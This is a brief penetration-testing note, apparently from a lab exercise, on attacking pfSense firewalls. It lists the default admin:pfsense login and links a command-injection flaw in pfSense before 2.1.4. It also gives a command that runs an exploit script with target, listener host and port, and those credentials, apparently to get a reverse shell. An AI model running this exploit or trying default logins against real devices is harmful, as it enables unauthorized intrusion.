______

pfSense is _a free and open source firewall and router_ that also features unified threat management, load balancing, multi WAN, and more.

`system-users.txt` 

# Default Username and Password

https://docs.netgate.com/pfsense/en/latest/usermanager/defaults.html

admin:pfsense

# pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection 

https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/

```bash
python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.21 --lport 443 --username admin --password pfsense
```
